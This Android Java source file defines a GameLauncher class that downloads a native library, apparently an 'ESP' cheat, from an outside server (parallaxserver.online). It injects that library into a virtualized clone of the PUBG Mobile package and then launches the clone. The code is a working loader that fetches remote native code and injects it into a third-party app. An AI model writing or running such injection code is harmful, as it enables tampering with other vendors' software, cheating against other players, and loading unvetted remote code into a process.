package com.onecore.loader;

import android.content.Context;
import com.onecore.sdk.VirtualContainer;
import com.onecore.sdk.utils.Logger;
import java.io.File;

/**
 * Handles the final sequence of Injection -> Cloned Launch.
 */
public class GameLauncher {
    private static final String TAG = "GameLauncher";
    private static final String TARGET_PKG = "com.pubg.imobile";
    private static final String LIB_URL = "https://parallaxserver.online/filemanager/raw.php?file=libOWNERHUBEE.so";

    public static void start(Context context) {
        Logger.i(TAG, "Starting GameLauncher Sequence...");

        // 1. Download Modded Library
        String fileName = "modded_esp.so";
        VirtualContainer.getInstance().downloadAndInject(context, TARGET_PKG, LIB_URL, fileName);

        // 2. Launch the Cloned Sandbox
        // The injection will be automatically picked up by SandboxActivity 
        // since we queued it via injectToVirtualSpace inside the downloader callback.
        new Thread(() -> {
            try {
                // Short sleep to ensure download thread initializes properly
                Thread.sleep(1000); 
                VirtualContainer.getInstance().launch(context, TARGET_PKG);
            } catch (InterruptedException e) {
                Logger.e(TAG, "Launch delayed", e);
            }
        }).start();
    }
}
